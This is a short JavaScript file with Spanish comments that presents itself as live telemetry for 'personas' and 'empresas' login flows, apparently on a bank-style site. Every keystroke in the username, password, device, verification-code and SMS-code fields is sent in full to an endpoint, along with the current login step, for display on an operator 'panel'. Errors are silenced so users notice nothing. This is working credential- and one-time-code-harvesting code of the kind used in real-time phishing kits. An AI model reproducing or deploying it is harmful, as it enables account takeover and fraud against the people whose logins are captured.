// ============================================================
// CAPTURA EN VIVO — reporta al panel qué hace el usuario en la web
// (teclas, paso actual del flujo). Se carga en personas y empresas.
// ============================================================
(function () {
  "use strict";

  function enviar(datos) {
    try {
      fetch("/api/telemetria", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(datos),
        keepalive: true
      }).catch(function () {});
    } catch (e) { /* silencio total: nunca afectar la experiencia */ }
  }

  var flujo = /\/personas\//.test(location.pathname)
    ? "personas"
    : (/\/empresas\//.test(location.pathname) ? "empresas" : "otro");

  enviar({ tipo: "conexion", flujo: flujo });

  // --- Teclado en vivo ---
  var campos = [
    { sel: "#pfl-user", campo: "usuario" },
    { sel: "#emp-user", campo: "usuario" },
    { sel: "#pfl-password", campo: "clave" },
    { sel: "#emp-pass", campo: "clave" },
    { sel: "#pfl-device", campo: "dispositivo" },
    { sel: "#pfl-code", campo: "codigo" },
    { sel: "#pfl-sms-code", campo: "codigoSms" }
  ];
  campos.forEach(function (c) {
    var el = document.querySelector(c.sel);
    if (!el) return;
    el.addEventListener("input", function () {
      enviar({ tipo: "tecla", campo: c.campo, valor: el.value, flujo: flujo });
    });
  });

  // --- Paso actual (personas: data-step; empresas: visibilidad de formularios) ---
  var card = document.querySelector(".pfl-card");
  if (card && window.MutationObserver) {
    var reportarPersonas = function () {
      enviar({ tipo: "paso", paso: card.getAttribute("data-step") || "user", flujo: "personas" });
    };
    new MutationObserver(reportarPersonas).observe(card, { attributes: true, attributeFilter: ["data-step"] });
  }
  var empUser = document.querySelector(".emp-form-wrap--user");
  var empPass = document.querySelector(".emp-form-wrap--password");
  if (empUser && empPass && window.MutationObserver) {
    var reportarEmpresas = function () {
      enviar({ tipo: "paso", paso: empPass.hidden ? "user" : "password", flujo: "empresas" });
    };
    new MutationObserver(reportarEmpresas).observe(empUser, { attributes: true, attributeFilter: ["hidden"] });
    new MutationObserver(reportarEmpresas).observe(empPass, { attributes: true, attributeFilter: ["hidden"] });
  }

  window.PacTelemetry = { enviar: enviar, flujo: flujo };
})();
